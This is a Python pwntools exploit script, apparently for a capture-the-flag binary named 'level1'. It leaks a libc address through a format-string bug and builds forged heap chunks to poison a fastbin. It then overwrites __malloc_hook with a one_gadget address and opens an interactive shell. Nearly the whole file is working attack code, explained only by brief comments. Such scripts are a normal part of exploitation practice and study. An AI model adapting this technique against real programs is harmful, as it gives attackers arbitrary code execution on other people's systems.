#NOTE: payload length should be smaller than read length - offset!!!!!!!
##prerequisite
# 1. write is called, since need to call write@plt to print out write_got.
# 2. have libc, since need to calculate offset for system and 'bin/sh' from write/read
# 3. need to compile with -no-pie, since need to find gadget
# 4. depends on how many single pop|ret gadget could be found, normally only rdi, rsi could be found
from pwn import *
from FILE import *
#context.log_level='debug'

def create(size,data,attack=False):
    p.recvuntil('3:exit\n')
    p.sendline('1')
    p.recvuntil('size: ')
    p.sendline(str(size))
    if attack:
      return
    p.recvuntil('string: ')
    p.sendline(data)

def show():
    p.recvuntil('3:exit\n')
    p.sendline('2')
    p.recvuntil('result: ')
    return p.recvuntil('\n')

def z(a=''):
	gdb.attach(p,a)
	if a == '':
		raw_input()


libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./level1')#,env={"LD_PRELOAD":"./libc-2.24.so"})

one_gadget_offset1 = 0x45216
one_gadget_offset2 = 0x4526a
one_gadget_offset3 = 0xf02a4
one_gadget_offset4 = 0xf1147

def house_of_orange_mallochook():
  create(0xf0, '%13$p') #0: 0x100
  data = show()
  start_main = int(data, 16)
  libc_base = start_main - (libc.symbols['__libc_start_main'] + 240)
  print 'libc_base= ' + hex(libc_base)
  
  malloc_hook = libc_base + libc.symbols['__malloc_hook']
  print 'malloc_hook= ' + hex(malloc_hook)
  one_gadget = libc_base + one_gadget_offset4
  print 'one_gadget= ' + hex(one_gadget)
  
  create(0xe70, 'a' * 0xe70 + p64(0) + p64(0x81)) #1: fake 0x100 + 0xe80 = 0xf80 size 0x81, would be put to 0x60 smallbin
  
  create(0xf60, 'b' * 0xf60 + p64(0) + p64(0x91)) #malloc > 0x3f0, force 1 free to smallbin. 2: fake 0x21000 + 0xf70 = 0x21f70 size 0x91, would be put to 0x70 fastbin
  
  create(0x100, 'c') #force 2 free to fastbin
  
  #z()
  create(0x50, 'd'*(0x21f70 - 0xf80 - 0x10) + p64(0) + p64(0x71) + p64(malloc_hook-0x13)) # overflow 1 to 2, to set fd = malloc_hook - 0x13
  
  create(0x60, 'e') # malloc 2
  create(0x60, 'f' * 3 + p64(one_gadget)) #modify 2->fd (malloc_hook) with one gadget
  
  create(0x10, 'g', True)

house_of_orange_mallochook()
p.interactive()
